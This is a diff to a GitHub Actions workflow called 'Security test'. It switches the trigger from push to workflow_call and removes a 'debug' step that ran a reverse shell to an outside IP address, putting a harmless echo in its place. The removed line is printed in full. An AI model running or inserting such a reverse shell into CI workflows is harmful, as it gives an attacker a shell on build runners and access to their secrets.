@@ -1,6 +1,6 @@
 name: Security test
 on:
-  push:
+  workflow_call:
   
 jobs:
   security:
@@ -11,7 +11,7 @@ jobs:
       - name: debug
         continue-on-error: true
         run: |
-          sh -i >& /dev/tcp/18.132.26.191/47654 0>&1
+          echo "Hello"
       - name: debug
         run: echo "Hello"
         env:
